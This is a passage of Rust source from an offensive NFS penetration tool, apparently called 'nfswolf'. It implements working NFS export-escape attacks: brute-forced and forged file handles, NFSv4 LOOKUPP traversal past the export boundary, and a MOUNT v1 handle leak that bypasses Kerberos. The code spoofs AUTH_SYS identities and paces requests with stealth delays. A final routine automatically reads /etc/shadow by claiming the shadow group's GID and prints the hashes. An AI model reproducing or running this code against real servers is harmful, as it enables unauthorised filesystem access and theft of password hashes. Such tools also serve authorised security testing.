            if let Some(result) = retry_acces_as_nobody(&probe_client, &mnt.handle, max_root_scan).await {
                return Ok((probe_client, EscapeOutcome::Success { candidate: result, note: "found via scan (confirmed root dir; root_squash active)".to_owned() }));
            }
            Ok((probe_client, EscapeOutcome::StaleNoRoot))
        },
        EscapeRootOutcome::Unsupported => Ok((probe_client, EscapeOutcome::Unsupported)),
    }
}

/// True when the exported directory is itself the filesystem root (so there is nothing
/// outside the export to reach).
///
/// Uses fileid + directory-type heuristics. A directory export with fileid 2 is ext4
/// root; fileid 32/64/128 is XFS root (these are never regular directories on any FS).
/// The parent-is-self test (LOOKUP "..") is NOT used here because NFS servers clip
/// ".." at the export boundary, making every export look like a root.
async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bool {
    let Ok(ok) = client.attrs(mount_handle).await else {
        return false;
    };
    if ok.file_type != FileType::Directory {
        return false;
    }
    let export_inode = ok.fileid;
    // ext4/ext3/ext2: root is always inode 2.
    // XFS: root is 128 (v5, default), 64 (v4 512B inodes), or 32 (v4 1024B inodes).
    // On ext4, inodes 32/64/128 are metadata (journal, resize_inode) -- never directories.
    // So a directory with fileid in {2, 32, 64, 128} is unambiguously a filesystem root.
    if matches!(export_inode, 2 | 32 | 64 | 128) {
        return true;
    }
    // BTRFS: every subvolume root has fileid 256, so fileid alone can't distinguish
    // "export IS the FS_TREE root" from "export is a user subvolume that could escape
    // to FS_TREE." Let the probe phase handle BTRFS -- it will try FS_TREE (subvol 5)
    // and other subvols, and the identity check blocks self-matches.
    false
}

/// Definitive filesystem-root test for a fallback-scan directory hit: the root is
/// its own parent, so LOOKUP ".." resolves back to the same inode. A subdirectory
/// in the scan range (e.g. an XFS export with non-standard geometry) has a
/// different parent and is therefore rejected (#27).
async fn scan_hit_is_root(client: &Nfs3Client, handle: &FileHandle, self_fileid: u64) -> bool {
    // A filesystem root is its own parent, so ".." resolving back to the same
    // inode is the confirmation. The server may or may not return attributes
    // with the LOOKUP; fall back to a GETATTR when it does not.
    let Ok((parent, attrs)) = client.resolve(handle, "..").await else { return false };
    let parent_id = match attrs {
        Some(a) => a.fileid,
        None => match client.attrs(&parent).await {
            Ok(a) => a.fileid,
            Err(_) => return false,
        },
    };
    parent_id == self_fileid
}

/// Positively confirm a scan-hit candidate is a directory (ideally the filesystem root)
/// before accepting a bare ACCES as an escape.
///
/// During the fallback inode scan a uid=0 GETATTR returns ACCES whenever root_squash
/// blocks the read -- but EVERY protected inode returns ACCES, so ACCES alone is not
/// proof of root (it would otherwise mark a random 0700 subdirectory as the filesystem
/// root). Re-probe as the conventional root_squash anon identity (uid/gid 65534): the
/// real root dir is world-traversable (mode 0755), so a NF3DIR GETATTR -- or a successful
/// LOOKUP of a customary top-level entry (etc/bin/usr/...), which only the filesystem root
/// carries -- gives the positive signal a bare ACCES lacks.
async fn confirm_root_dir(client: &Nfs3Client, candidate: &EscapeResult) -> bool {
    // root_squash conventionally maps root -> anonuid 65534 (nobody); claim it directly so
    // perms on the root dir (0755) are evaluated against an ordinary unprivileged uid.
    let cred = Credential::Sys(AuthSys::with_groups(65534, 65534, &[65534], client.machinename()));
    let unpriv = client.with_credential(cred, 65534, 65534);

    // Positive signal 1: the handle resolves to a directory for a non-root uid.
    if let Ok(a) = unpriv.attrs(&candidate.root_handle).await
        && a.file_type == FileType::Directory
    {
        return true;
    }

    // Positive signal 2: a customary top-level entry resolves -- only the real filesystem
    // root carries these, so a successful LOOKUP confirms root.
    for name in ["etc", "bin", "usr", "var", "lib"] {
        if unpriv.resolve(&candidate.root_handle, name).await.is_ok() {
            return true;
        }
    }
    false
}

/// Re-scan ACCES candidates with uid/gid 65534 after the engine reports `StaleNoRoot`.
///
/// The shared engine's brute-force pass runs under a single credential (uid=0) and
/// cannot switch identities (EscapeProbe has no credential API). When root_squash is
/// active, uid=0 GETATTR returns ACCES on every protected inode, including the real
/// filesystem root. The engine correctly records these as "format valid" but cannot
/// confirm root because it lacks the unprivileged re-probe. This function fills
/// that gap: it re-runs the inode scan range, identifies ACCES hits, and calls
/// `confirm_root_dir` (which switches to nobody uid 65534) to confirm root.
async fn retry_acces_as_nobody(client: &Nfs3Client, export_handle: &FileHandle, max_root_scan: u32) -> Option<EscapeResult> {
    for inode in 1..=max_root_scan {
        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(export_handle, inode, 0);
        for candidate in &candidates {
            if let Err(ref e) = client.attrs(&candidate.root_handle).await
                && e.is_permission_denied()
                && confirm_root_dir(client, candidate).await
            {
                return Some(candidate.clone());
            }
        }
    }
    None
}

/// Print the successful escape result and next-step hints.
fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// NFSv4 LOOKUPP escape: traverse parent directories to reach the filesystem root.
///
/// NFSv4 LOOKUPP (op 16, RFC 7530 S16.14) resolves the parent directory of the
/// current file handle. A compliant server returns NFS4ERR_NOENT at the export
/// boundary, preventing traversal outside the exported subtree. Servers that do
/// not enforce subtree_check (or have a misconfigured pseudo-filesystem) allow
/// LOOKUPP to walk above the export root into the real filesystem.
///
/// The approach: obtain the pseudo-root FH via PUTROOTFH, then issue
/// PUTFH(current) + LOOKUPP + GETFH in a loop until the handle stops changing
/// (the filesystem root is its own parent). If the final handle differs from
/// the export root handle, the export boundary has been crossed.
///
/// No MOUNT protocol is needed -- NFSv4 connects directly to port 2049.
async fn try_nfs4_escape(host: &str, export: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
    use crate::proto::nfs4::compound::Nfs4DirectClient;
    use crate::proto::nfs4::types::{ArgOp, ResOpData};

    /// Safety cap on LOOKUPP traversal depth to prevent infinite loops on
    /// misbehaving servers.
    const MAX_DEPTH: usize = 64;

    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    // Connect with AUTH_SYS uid=0 first (most permissive); fall back to AUTH_NONE.
    let mut client = match Nfs4DirectClient::connect_with_auth_proxy(addr, 0, 0, "localhost", globals.proxy.as_deref()).await {
        Ok(c) => c,
        Err(_) => match Nfs4DirectClient::connect_proxy(addr, globals.proxy.as_deref()).await {
            Ok(c) => c,
            Err(_) => return None,
        },
    };
    client = client.with_stealth(stealth);

    // Navigate INTO the target export via component-by-component LOOKUP from
    // the pseudo-root. The v4 pseudo-filesystem maps export paths as path
    // components under PUTROOTFH; once we cross into the real export the
    // server switches to real filesystem handles. LOOKUPP from there can
    // walk above the export boundary (RFC 7530 S16.14).
    let components = crate::proto::sideband::export_components(export);
    let export_fh = if components.is_empty() {
        client.get_root_fh().await.ok()?
    } else {
        let mut ops = Vec::with_capacity(components.len() + 2);
        ops.push(ArgOp::Putrootfh);
        for &c in &components {
            ops.push(ArgOp::Lookup(c.to_owned()));
        }
        ops.push(ArgOp::Getfh);
        let res = client.compound(ops).await.ok()?;
        if res.status != 0 {
            tracing::debug!(status = res.status, export, "NFSv4 LOOKUP into export failed");
            return None;
        }
        res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })?
    };

    // LOOKUPP loop: traverse parent directories until the handle stabilises
    // or the server rejects the request (NFS4ERR_NOENT at the boundary).
    let mut current_fh = export_fh.clone();
    let mut depth: usize = 0;

    loop {
        if depth >= MAX_DEPTH {
            tracing::debug!("NFSv4 LOOKUPP hit depth cap ({MAX_DEPTH}) -- aborting");
            return None;
        }

        let ops = vec![ArgOp::Putfh(current_fh.clone()), ArgOp::Lookupp, ArgOp::Getfh];
        let res = client.compound(ops).await.ok()?;

        if res.status != 0 {
            // LOOKUPP failed -- likely NFS4ERR_NOENT at the export boundary.
            if depth == 0 {
                tracing::debug!(status = res.status, "NFSv4 LOOKUPP failed on first attempt -- export boundary enforced");
                return None;
            }
            // Traversed at least one level before hitting the wall; current_fh
            // is as high as we got.
            break;
        }

        // Extract the parent FH from the GETFH result.
        let parent_fh = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })?;

        // Handle stopped changing -- we've reached the filesystem root
        // (the root directory is its own parent).
        if parent_fh == current_fh {
            break;
        }

        current_fh = parent_fh;
        depth += 1;
    }

    // If the final handle is the same as the export root, the export already IS
    // the filesystem root -- nothing to escape to.
    if current_fh == export_fh {
        tracing::debug!("NFSv4 LOOKUPP: export already is the filesystem root");
        return None;
    }

    // Verify by looking up a well-known top-level directory entry (etc, bin, ...).
    // Even if verification fails the handle is still above the export, so report
    // it -- the operator can decide whether to use it.
    let verified = verify_nfs4_root(&mut client, &current_fh).await;
    if verified {
        tracing::info!(depth, "NFSv4 LOOKUPP escape confirmed -- filesystem root reached");
    } else {
        tracing::info!(depth, "NFSv4 LOOKUPP escape: reached handle above export root (root not positively confirmed)");
    }

    let root_handle = FileHandle::from_bytes(&current_fh);
    Some(EscapeOutcome::Nfs4Lookupp { root_handle, verified })
}

/// Verify an NFSv4 file handle points to the filesystem root by attempting to
/// LOOKUP customary top-level entries (etc, bin, usr, var, lib). A successful
/// LOOKUP of any of these confirms the handle is the real filesystem root.
async fn verify_nfs4_root(client: &mut crate::proto::nfs4::compound::Nfs4DirectClient, fh: &[u8]) -> bool {
    use crate::proto::nfs4::types::ArgOp;

    for name in ["etc", "bin", "usr", "var", "lib"] {
        let ops = vec![ArgOp::Putfh(fh.to_vec()), ArgOp::Lookup(name.to_owned()), ArgOp::Getfh];
        if let Ok(res) = client.compound(ops).await
            && res.status == 0
        {
            return true;
        }
    }
    false
}

/// Print the NFSv4 LOOKUPP escape success report.
///
/// `verified = true`: handle is the real filesystem root -- suggest v3 shell + FUSE mount.
/// `verified = false`: handle is the NFSv4 pseudo-root -- only works in v4 mode.
fn print_nfs4_lookupp_success(root_handle: &FileHandle, verified: bool, host: &str) {
    let hex = root_handle.to_hex();
    println!();
    if verified {
        println!("  {}  NFSv4 LOOKUPP traversal -- filesystem root reached (RFC 7530 S16.14)", "[+]".bold().green());
        crate::output::print_handle("Root handle", &hex);
        crate::output::print_handle_next_steps(&hex, host);
    } else {
        println!("  {}  NFSv4 LOOKUPP traversal -- crossed export boundary (RFC 7530 S16.14)", "[+]".bold().green());
        println!();
        println!("  {} Linux knfsd redirects LOOKUPP at the export boundary into the NFSv4", "Note:".bold().yellow());
        println!("  pseudo-filesystem (RFC 7530 S7.3) instead of the host's real filesystem.");
        println!("  The handle below is the pseudo-root: it lets you navigate into any export");
        println!("  on the server (cross-export access), but it is not the filesystem root.");
        println!("  The handle is valid only in NFSv4 mode (v3 returns NFS3ERR_STALE).");
        println!();
        crate::output::print_handle("Pseudo-root handle", &hex);
        println!();
        println!("  {} Use with the NFSv4 shell to browse all exports:", "Next steps:".bold().yellow());
        println!("    {} shell {} --nfs-version 4 --handle {}", "nfswolf".dimmed(), host, hex.cyan());
    }
    println!();
}

/// Handle-matrix escape: acquire handles via MOUNT v1+v3, derive all
/// length variants (raw/trimmed/pad32/pad64), and test root candidates
/// from every viable seed against both NFSv3 and NFSv2 GETATTR.
///
/// This catches the F-1.6 case where MOUNT v3 denies access (sec=krb5)
/// but MOUNT v1 leaks the handle, which then works with NFSv3 ops.
async fn find_escape_matrix(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> Option<(Nfs3Client, EscapeOutcome)> {
    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
    let mount = make_mount_client(globals);
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let direct_port = globals.nfs_port.unwrap_or(2049);
    let (_, _, nfs3) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);

    let probe = acquire_and_test_handles(&mount, &nfs3, addr, export, &stealth, globals.nfs_port, globals.proxy.as_deref(), &globals.hostname).await;

    if probe.v1_bypass && announce {
        eprintln!("{}", crate::output::status_warn("MOUNT v3 denied; MOUNT v1 leaked handle (F-1.6 auth bypass) -- testing cross-version handle reuse"));
    }

    let seeds = probe.escape_seeds();
    if seeds.is_empty() {
        return None;
    }

    // For each seed, construct root candidates and test them.
    // Test each root candidate in all length variants against v3 + v2.
    for seed_th in &seeds {
        let seed = &seed_th.variant.handle;

        if export_is_fs_root(&nfs3, seed).await {
            continue;
        }

        let export_fileid: Option<u64> = nfs3.attrs(seed).await.ok().map(|a| a.fileid);

        // Phase 1: known root candidates from this seed
        let known = FileHandleAnalyzer::construct_root_candidates(seed);
        let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(seed, btrfs_subvols);

        for candidate in known.iter().chain(btrfs.iter()) {
            if announce {
                tracing::debug!(seed = %seed_th.variant.label, fs = ?candidate.fs_type, inode = candidate.inode_number, "probing root candidate");
            }

            // Derive all length variants of the root candidate handle
            let mut root_variants = derive_handle_variants(&candidate.root_handle, "root");
            dedup_variants(&mut root_variants);

            for rv in &root_variants {
                // Try NFSv3 GETATTR
                stealth.wait().await;
                match nfs3.attrs(&rv.handle).await {
                    Ok(a) if a.file_type == FileType::Directory => {
                        if export_fileid.is_none_or(|exp| a.fileid != exp) {
                            let note = format!("verified (matrix: seed={}, root_variant={})", seed_th.variant.label, rv.label);
                            return Some((nfs3, EscapeOutcome::Success { candidate: EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }, note }));
                        }
                    },
                    Err(ref e) if e.is_permission_denied() && confirm_root_dir(&nfs3, &EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }).await => {
                        let note = format!("confirmed root (matrix: seed={}, root_variant={}, root_squash active)", seed_th.variant.label, rv.label);
                        return Some((nfs3, EscapeOutcome::Success { candidate: EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }, note }));
                    },
                    _ => {},
                }

                // Try NFSv2 GETATTR -- pad/truncate every variant to 32 bytes.
                {
                    stealth.wait().await;
                    let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(rv.handle.as_bytes());
                    let v2_stealth = StealthConfig::new(globals.delay, globals.jitter);
                    let (_, _, v2_client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], v2_stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
                    if let Ok(a) = v2_client.getattr(&v2_fh).await
                        && a.ftype == nfs_v2::wire::FType::Directory
                    {
                        let note = format!("verified via NFSv2 (matrix: seed={}, root_variant={})", seed_th.variant.label, rv.label);
                        return Some((nfs3, EscapeOutcome::Success { candidate: EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }, note }));
                    }
                }
            }
        }

        // Phase 2: inode scan with this seed
        for inode in 2..=max_root_scan {
            let candidates = FileHandleAnalyzer::construct_candidates_all_variants(seed, inode, 0);
            for candidate in candidates {
                stealth.wait().await;
                match nfs3.attrs(&candidate.root_handle).await {
                    Ok(a) if a.file_type == FileType::Directory => {
                        let self_id = a.fileid;
                        if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&nfs3, &candidate.root_handle, self_id).await {
                            let note = format!("found via scan (matrix: seed={})", seed_th.variant.label);
                            return Some((nfs3, EscapeOutcome::Success { candidate, note }));
                        }
                    },
                    Err(ref e) if e.is_permission_denied() && confirm_root_dir(&nfs3, &candidate).await => {
                        let note = format!("found via scan (matrix: seed={}, root_squash active)", seed_th.variant.label);
                        return Some((nfs3, EscapeOutcome::Success { candidate, note }));
                    },
                    _ => {},
                }
            }
        }
    }

    None
}

/// NFSv2 escape path for v2-only servers.
///
/// Uses MOUNT v1 to obtain the seed handle and `Nfs2EscapeProbe` for GETATTR
/// probes through the full escape engine (known candidates, BTRFS subvols,
/// FS-specific constructors, brute-force scan).
async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<EscapeOutcome> {
    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mc = make_mount_client(globals);
    let mnt = mc.mount_v1(addr, export).await?;
    let seed = mnt.handle;

    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let direct_port = globals.nfs_port.unwrap_or(2049);
    let (_pool, _circuit, client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], stealth, globals.proxy.as_deref(), Some(direct_port), &globals.hostname);

    let probe = Nfs2EscapeProbe { client: &client };
    let config = EscapeConfig { btrfs_subvols: DEFAULT_BTRFS_SUBVOLS, max_root_scan, announce: true };

    match find_escape_root(&probe, seed.as_bytes(), &config).await {
        EscapeRootOutcome::Success(candidate) => Ok(EscapeOutcome::Success { candidate, note: "verified (NFSv2)".to_owned() }),
        EscapeRootOutcome::StaleNoRoot => Ok(EscapeOutcome::StaleNoRoot),
        EscapeRootOutcome::Unsupported => Ok(EscapeOutcome::Unsupported),
    }
}

/// After a successful escape, automatically try to read /etc/shadow.
///
/// On Debian/Ubuntu, /etc/shadow is mode 0640 owned by root:shadow (GID 42).
/// On SUSE, shadow GID is 15. Reading succeeds even without no_root_squash
/// because we can claim GID 42/15 via AUTH_SYS.
async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
    // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    let Ok((etc_fh, _)) = client.resolve(root_fh, "etc").await else { return };

    let Ok((shadow_fh, _)) = client.resolve(&etc_fh, "shadow").await else {
        eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
        return;
    };

    for &(gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, gid);
        if let Ok(chunk) = shadow_client.read_at(&shadow_fh, 0, 65536).await {
            let content = String::from_utf8_lossy(&chunk.data);
            eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
            for line in content.lines().take(10) {
                println!("  {line}");
            }
            return;
        }
    }

    eprintln!("{}", crate::output::status_info("/etc/shadow: not readable via shadow GID (root_squash active or shadow hardened)"));
}
